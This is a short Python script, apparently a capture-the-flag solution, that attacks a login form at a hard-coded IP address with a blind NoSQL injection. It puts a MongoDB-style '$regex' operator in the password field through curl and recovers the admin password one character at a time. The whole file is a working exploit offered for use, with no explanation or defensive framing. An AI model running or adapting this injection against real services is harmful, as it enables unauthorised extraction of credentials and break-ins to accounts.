from utils.ctftools import blind_sqli
import re
import subprocess
import string

def inject(s):
	#idk why but requests doesn't work
	resp = subprocess.run(
		[
		"curl", "http://34.93.215.188:3000/", "--data",
		f"username=admin&password[$regex]=^{re.escape(s)}.*$"
		],
		check=True,
		stdout=subprocess.PIPE,
		stderr=subprocess.DEVNULL
	).stdout
	print(resp)
	return b"No user" not in resp

blind_sqli(
	"{0}",
	inject,
	chars=string.ascii_lowercase + string.digits + string.punctuation + string.ascii_uppercase
)
